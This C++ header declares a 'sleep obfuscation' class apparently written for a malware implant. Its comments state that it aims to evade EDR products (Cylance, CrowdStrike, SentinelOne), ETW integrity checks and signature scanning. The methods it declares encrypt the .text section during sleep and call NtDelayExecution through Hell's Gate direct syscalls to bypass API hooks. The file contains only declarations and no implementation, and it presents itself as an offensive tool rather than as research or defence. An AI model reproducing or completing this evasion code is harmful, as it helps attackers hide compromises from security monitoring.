#pragma once
// ============================================================================
// sleep_obfuscation.h — Enhanced Sleep Obfuscation Module
// ============================================================================
// Multi-layer memory obfuscation during sleep periods to evade:
//   - EDR memory scanners (Cylance, CrowdStrike, SentinelOne)
//   - ETW-based memory integrity checks
//   - .text section signature scanning
//
// Techniques:
//   1. .text section XOR encryption via VirtualAlloc trampoline (defeats sig scanning)
//   2. NtDelayExecution via Hell's Gate (bypasses Sleep API hooks)
//   3. Multi-phase sleep with timing jitter (defeats pattern analysis)
//
// Thread Safety: NOT thread-safe. Single-threaded usage expected.
// ============================================================================

#include <cstdint>

#ifdef _WIN32
#include <windows.h>
#endif

class SleepObfuscation {
public:
    static bool init();
    static void obfuscatedSleep(int seconds);
    static void obfuscatedSleepMs(int milliseconds);
    static bool isInitialized();

private:
    static bool encryptTextSection();
    static bool decryptTextSection();
    static bool ntDelayExecution(int64_t delay100ns);

    static bool s_initialized;
    static bool s_textEncrypted;
    static uint8_t* s_textBase;
    static uint32_t s_textSize;
    static uint8_t  s_textBackupKey[32];
};

#ifdef _WIN32
typedef long NTSTATUS;
typedef NTSTATUS (NTAPI *NtDelayExecutionFunc)(BOOL Alertable, PLARGE_INTEGER DelayInterval);
extern NtDelayExecutionFunc g_NtDelayExecution;
#endif
